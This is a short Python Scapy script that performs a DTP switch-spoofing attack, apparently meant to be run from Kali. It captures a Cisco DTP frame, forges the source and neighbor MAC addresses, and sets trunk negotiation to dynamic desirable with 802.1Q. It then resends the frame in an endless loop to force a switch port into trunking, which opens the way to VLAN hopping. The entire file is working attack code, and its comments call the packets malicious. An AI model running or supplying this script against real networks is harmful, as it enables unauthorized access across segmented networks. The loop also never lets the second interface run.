import sys
import re
from scapy.all import *
from scapy.contrib.dtp import DTP, DTPNeighbor, DTPStatus, DTPType
import time

# Validate MAC address input
try:
    mac = sys.argv[1]
    if not re.match("^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$", mac.lower()):
        print("MAC address must be in format: 00:11:22:33:44:55, exiting")
        sys.exit(1)
except IndexError:
    print("You must enter Kali's MAC address, e.g. 00:11:22:33:44:55 as argument")
    sys.exit(1)

# Interface names
interfaces = ["eth0", "eth1"]

# Function to craft and send DTP packet
def send_dtp_packet(interface, mac):
    # Capture one DTP packet from the neighbor switch on the specified interface
    pkt = sniff(iface=interface, count=1, filter="ether dst 01:00:0c:cc:cc:cc")[0]
    
    # Ensure the packet is a DTP packet before proceeding
    if DTP in pkt:
        # Modify the source MAC address
        pkt.src = mac

        # Modify the neighbor MAC address in DTP
        pkt[DTP][DTPNeighbor].neighbor = mac

        # Set trunk mode to dynamic desirable (0x03 in hex)
        pkt[DTP][DTPStatus].status = b'\x03'

        # Set trunk type to 802.1q
        pkt[DTP][DTPType].dtptype = b'E'

        # Send malicious DTP packets in a loop on the specified interface
        while True:
            sendp(pkt, iface=interface, verbose=1)
            time.sleep(10)
    else:
        print(f"No DTP packet captured on {interface}, exiting.")

# Send DTP packets to both switches (via eth0 and eth1)
for interface in interfaces:
    send_dtp_packet(interface, mac)
